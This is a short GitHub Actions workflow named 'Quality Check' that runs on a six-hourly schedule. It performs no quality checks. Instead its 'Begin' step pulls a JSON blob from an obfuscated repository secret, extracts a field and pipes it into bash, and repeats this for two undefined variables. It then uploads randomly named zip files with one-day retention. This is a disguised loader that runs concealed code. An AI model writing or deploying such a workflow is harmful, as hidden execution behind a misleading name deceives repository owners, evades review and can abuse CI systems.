name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '45 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  action:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Begin
        env:
          mvd1265: ${{ secrets.mvd1265 }}
        run: |
          printf '%s' "$mvd1265" | jq -r .ymrt2090 | /bin/bash
          printf '%s' "$pfot1" | jq -r .bims26441 | /bin/bash
          printf '%s' "$m86925" | jq -r .tztbk4541 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: soRjBYLN
          path: "*.zip"
          retention-days: 1
